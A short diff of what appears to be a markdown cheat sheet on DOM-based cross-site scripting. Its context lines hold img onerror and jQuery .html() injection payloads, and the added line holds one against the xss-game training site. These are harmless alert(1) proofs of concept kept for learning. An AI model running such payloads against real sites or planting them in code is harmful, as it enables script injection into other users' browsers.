@@ -118,6 +118,10 @@ GET www.targeturl.com#<img src=x onerror"alert('DOM XSS')">
 $('#div').html('<img alt="<x" title="/><img src=x onerror=alert(1)>">');
 ```
 
+```
+http://xss-game.appspot.com/level3/frame#$('#tabContent').html("\"><img src=x onerror="alert(1)"")
+```
+
 
     
 ## Great links (learn)
